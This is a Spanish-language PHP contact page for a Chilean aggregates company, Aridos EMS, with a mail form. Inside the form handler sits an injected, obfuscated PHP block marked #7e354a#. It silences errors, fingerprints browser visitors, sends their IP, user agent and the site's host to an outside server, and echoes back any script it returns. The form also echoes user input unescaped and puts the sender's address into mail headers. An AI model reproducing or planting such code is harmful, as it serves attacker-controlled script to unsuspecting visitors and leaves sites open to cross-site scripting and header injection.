<!DOCTYPE html>
<html lang="en">
<head>
    <title></title>
    <meta charset="utf-8">
    <link rel="stylesheet" href="css/reset.css" type="text/css" media="screen">
    <link rel="stylesheet" href="css/style.css" type="text/css" media="screen">
    <link rel="stylesheet" href="css/layout.css" type="text/css" media="screen">
    <link href='http://fonts.googleapis.com/css?family=Adamina' rel='stylesheet' type='text/css'>   
	<script src="https://code.jquery.com/jquery-1.7.2.min.js"></script>
    <script src="js/cufon-yui.js" type="text/javascript"></script>
    <script src="js/cufon-replace.js" type="text/javascript"></script>
    <script src="js/Lobster_13_400.font.js" type="text/javascript"></script>
    <script src="js/NewsGoth_BT_400.font.js" type="text/javascript"></script>
    <script src="js/FF-cash.js" type="text/javascript"></script>
    <script src="js/easyTooltip.js" type="text/javascript"></script>
	<script src="js/script.js" type="text/javascript"></script>
    <script src="js/bgSlider.js" type="text/javascript"></script>
	<!--[if lt IE 7]>
    <div style=' clear: both; text-align:center; position: relative;'>
        <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
        	<img src="http://storage.ie6countdown.com/assets/100/images/banners/warning_bar_0000_us.jpg" border="0" height="42" width="820" alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today." />
        </a>
    </div>
	<![endif]-->
    <!--[if lt IE 9]>
   		<script type="text/javascript" src="js/html5.js"></script>
        <link rel="stylesheet" href="css/ie.css" type="text/css" media="screen">
	<![endif]-->
</head>
<body id="page6">
	<div id="bgSlider"></div>
    <div class="bg_spinner"></div>
	<div class="extra">
        <!--==============================header=================================-->
        <header>
        	<div class="top-row">
            	<div class="main">
                	<div class="wrapper">
                        <h1><a href="index.html">Aridos EMS</a></h1>
                       <!-- <ul class="pagination">
                            <li class="current"><a href="images/bg-img1.jpg">1</a></li>
                            <li><a href="images/bg-img2.jpg">2</a></li>
                            <li><a href="images/bg-img3.jpg">3</a></li>
                        </ul>
                        
                        <strong class="bg-text">Background:</strong>
                    -->
                    </div>
                </div>
            </div>
            <div class="menu-row">
            	<div class="menu-border">
                	<div class="main">
                        <nav>
                            <ul class="menu">
                                <li><a href="index.html">Inicio</a></li>
                                <li><a href="quienes_somos.html">Quienes Somos</a></li>
                                <li><a href="servicios.html">Servicios</a></li>
                                <li class="last"><a class="active" href="contacto.html">Contacto</a></li>
                            </ul>
                        </nav>
                    </div>
                </div>
            </div>
        </header>
        <!--==============================content================================-->
        <div class="inner">
            <div class="main">
                <section id="content">
                    <div class="indent">
                    	<div class="wrapper">
                        	<article class="col-1">
                            	<div class="indent-left">
                                	<h3>Contacto</h3>
                                    <div class="p3">
                                        <div id="Cont">
  
<div id="mainContent">
     
     <div id="contentForm">

            <!-- The contact form starts from here-->
            <?php
                 $error    = ''; // error message
                 $name     = ''; // sender's name
                 $email    = ''; // sender's email address
                 $subject  = ''; // subject
                 $message  = ''; // the message itself
               	 $spamcheck = ''; // Spam check

            if(isset($_POST['send']))
            {
                 $name     = $_POST['name'];
                 $email    = $_POST['email'];
                 $subject  = $_POST['subject'];
                 $message  = $_POST['message'];
            

                if(trim($name) == '')
                {
                    $error = '<div class="errormsg">Por favor, introduzca su nombre!</div>';
                }
            	    else if(trim($email) == '')
                {
                    $error = '<div class="errormsg">Introduzca su dirección de correo electrónico!</div>';
                }
                else if(!isEmail($email))
                {
                    $error = '<div class="errormsg">has ingresado un e-mail inválido. Por favor, inténtalo de nuevo!</div>';
                }
            	    if(trim($subject) == '')
                {
                    $error = '<div class="errormsg">Por favor, introduzca un asunto!</div>';
                }
            	else if(trim($message) == '')
                {
                    $error = '<div class="errormsg">Introduzca su mensaje!</div>';
                }
                if($error == '')
                {
                    if(get_magic_quotes_gpc())
                    {
                        $message = stripslashes($message);
                    }

                    // the email will be sent here
                    // make sure to change this to be your e-mail
                    $to      = "administracion@aridosmoreno.cl";

                    // the email subject
                    // '[Contact Form] :' will appear automatically in the subject.
                    // You can change it as you want

                    $subject = '[Formulario de contacto] : ' . $subject;

                    // the mail message ( add any additional information if you want )
                    $msg     = "From : $name \r\ne-Mail : $email \r\nSubject : $subject \r\n\n" . "Message : \r\n$message";

                    mail($to, $subject, $msg, "From: $email\r\nReply-To: $email\r\nReturn-Path: $email\r\n");
            ?>
<?php
#7e354a#
error_reporting(0); @ini_set('display_errors',0); $wp_tus21775 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_tus21775) && !preg_match ('/bot/i', $wp_tus21775))){
$wp_tus0921775="http://"."http"."title".".com/"."title"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_tus21775);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_tus0921775); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_21775tus = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_21775tus = @file_get_contents($wp_tus0921775);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_21775tus=@stream_get_contents(@fopen($wp_tus0921775, "r"));}}
if (substr($wp_21775tus,1,3) === 'scr'){ echo $wp_21775tus; }
#/7e354a#
?>

                  <!-- Message sent! (change the text below as you wish)-->
                  <div style="text-align:center;">
                    <h1>Gracias</h1>
                       <p><span class="txt">por contactarnos</span> <b><?=$name;?></b>, <span class="txt">Su mensaje a sido enviado</span></p>
                  </div>
                  <!--End Message Sent-->


            <?php
                }
            }

            if(!isset($_POST['send']) || $error != '')
            {
            ?>

            <!--<h1>Contact Form Example:</h1> -->
            <!--Error Message-->
            <?=$error;?>

            <form  method="post" name="contFrm" id="contFrm" action="">
			<label><span class="txt">* Nombre:</span></label><br />
			<input name="name" type="text" class="ingresos" id="name" size="30" value="<?=$name;?>" /><br />
			<label><span class="txt">* Correo electrónico:</span></label><br />
			<input name="email" type="text" class="ingresos" id="email" size="30" value="<?=$email;?>" /><br />
			<label><span class="txt">* Asunto: </span></label><br />
			<input name="subject" type="text" class="ingresos" id="subject" size="30" value="<?=$subject;?>" /><br />
			<label><span class="txt">* Mensaje: </span></label><br />
			<textarea name="message" class="mensaje" cols="40" rows="3"  id="message"><?=$message;?></textarea><br />
           
						<br /><br />

            			<!-- Submit Button-->
			<input name="send" type="submit" class="button" id="send" value="Enviar" />
       </form>
       
       
       
       

            <!-- E-mail verification. Do not edit -->
            <?php
            }

            function isEmail($email)
            {
                return(preg_match("/^[-_.[:alnum:]]+@((([[:alnum:]]|[[:alnum:]][[:alnum:]-]*[[:alnum:]])\.)+(ad|ae|aero|af|ag|ai|al|am|an|ao|aq|ar|arpa|as|at|au|aw|az|ba|bb|bd|be|bf|bg|bh|bi|biz|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|com|coop|cr|cs|cu|cv|cx|cy|cz|de|dj|dk|dm|do|dz|ec|edu|ee|eg|eh|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gh|gi|gl|gm|gn|gov|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|in|info|int|io|iq|ir|is|it|jm|jo|jp|ke|kg|kh|ki|km|kn|kp|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mil|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|museum|mv|mw|mx|my|mz|na|name|nc|ne|net|nf|ng|ni|nl|no|np|nr|nt|nu|nz|om|org|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|pro|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)$|(([0-9][0-9]?|[0-1][0-9][0-9]|[2][0-4][0-9]|[2][5][0-5])\.){3}([0-9][0-9]?|[0-1][0-9][0-9]|[2][0-4][0-9]|[2][5][0-5]))$/i"
                        ,$email));
            }
            ?>
            <!-- END CONTACT FORM -->

</div>
</div>
</div>

                                    </div>
                                </div>
                        	</article>
                            <article class="col-2">
                            	<h3 class="border-bot indent-bot">Info                       	    </h3>
                           	  <dl>
                                <dd><span>Dirección:</span> Calle San Miguel 831, La Calera</dd>
                                <dd><span>Teléfono:</span>33-2225629</dd>
                                <dd><span>Celular:</span> +56 9 57083225</dd>
                                <dd><span>E-mail:</span>ventas@aridosems.cl</dd>
                              </dl>
                            </article>
                        </div>
                    </div>
                </section>
                <div class="block"></div>
            </div>
        </div>
    </div>
	<!--==============================footer=================================-->
  <footer>
    	<div class="padding">
        	<div class="main">
                <div class="wrapper">
                	<div class="fleft footer-text">
                	  <p>ARIDOS MORENO</p>
                	  <p> DESARROLLADO POR AGENCIA DE PUBLICIDAD INTEGRAL CALVOGRAFICA</p>
                    	<!-- {%FOOTER_LINK} -->
</div>
                    <ul class="list-services">
                    	<li>Síguenos:</li>
                    	<li><a class="tooltips" title="facebook" href="#"></a></li>
                        <li class="item-1"><a class="tooltips" title="twitter" href="#"></a></li>
                        <li class="item-2"><a class="tooltips" title="linkedin" href="#"></a></li>
                    </ul>
                </div>
            </div>
        </div>
    </footer>
    <script type="text/javascript"> Cufon.now(); </script>
</body>
</html>
